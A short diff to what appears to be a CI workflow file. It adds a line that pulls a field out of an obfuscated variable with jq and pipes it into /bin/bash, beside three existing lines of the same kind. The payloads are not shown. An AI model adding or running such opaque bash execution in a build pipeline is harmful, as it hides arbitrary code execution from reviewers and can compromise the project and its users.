@@ -23,6 +23,7 @@ jobs:
           echo $gag3 | jq -r .w781 | /bin/bash
           echo $a3 | jq -r .fpgw6584 | /bin/bash
           echo $qilo4 | jq -r .wea289 | /bin/bash
+          printf '%s' "$fp94203" | jq -r .z8 | /bin/bash
 
       - name: Save archive
         if: always()
